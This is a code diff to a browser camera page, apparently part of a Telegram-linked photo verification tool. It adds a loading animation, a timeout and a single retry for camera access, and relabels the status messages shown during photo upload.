@@ -10,6 +10,9 @@ const guide = document.getElementById("guide");
 const status = document.getElementById("status");
 let audioContext = null;
 let captureLocked = false;
+let cameraRetry = 0;
+
+let loadingInterval = null;
 
 // =====================================
 // APPLICATION STATE
@@ -48,11 +51,55 @@ app.type  = params.get("type")  || "";
 app.session = params.get("session") || "";
 app.telegramId = params.get("telegramId") || "";
 
+function startLoadingAnimation() {
+
+	stopLoadingAnimation();
+
+    const frames = [
+
+        "📷 Initializing Camera.",
+        "📷 Initializing Camera..",
+        "📷 Initializing Camera..."
+
+    ];
+
+    let i = 0;
+
+    status.innerHTML = frames[0];
+
+    loadingInterval = setInterval(function () {
+
+        i = (i + 1) % frames.length;
+
+        status.innerHTML = frames[i];
+
+    }, 400);
+
+}
+
+function stopLoadingAnimation() {
+
+    clearInterval(loadingInterval);
+
+    loadingInterval = null;
+
+}
 // ============================
 // START CAMERA
 // ============================
 
 async function startCamera() {
+
+	startLoadingAnimation();
+
+const timeout = setTimeout(function () {
+
+    stopLoadingAnimation();
+
+    status.innerHTML =
+        "❌ Camera initialization timed out.<br>Please reopen the camera.";
+
+}, 10000);
 
     try {
 
@@ -78,6 +125,12 @@ async function startCamera() {
 
         await video.play();
 
+		clearTimeout(timeout);
+
+stopLoadingAnimation();
+
+cameraRetry = 0;
+
 // Reset camera state
 captureLocked = false;
 
@@ -93,7 +146,24 @@ status.innerHTML = "✅ Camera Ready";
 
         console.error(error);
 
-        status.innerHTML = "❌ Camera Access Denied";
+        clearTimeout(timeout);
+
+stopLoadingAnimation();
+
+if (cameraRetry < 1) {
+
+    cameraRetry++;
+
+    status.innerHTML = "🔄 Retrying Camera...";
+
+    setTimeout(startCamera, 1000);
+
+    return;
+
+}
+
+status.innerHTML =
+"❌ Unable to access camera.<br>Please reopen the camera.";
 
     }
 
@@ -948,7 +1018,7 @@ useBtn.hidden = true;
 status.innerHTML =
 `
 <div style="color:#22c55e;font-weight:bold;font-size:20px">
-✅ Upload Successful
+✅ Verification Complete
 </div>
 
 <div style="margin-top:10px">
@@ -1011,8 +1081,6 @@ useBtn.onclick = async function () {
         await getAddress();
 
         await buildWatermark();
-
-status.innerHTML="☁️ Uploading...";
 
 await uploadPhoto();
 
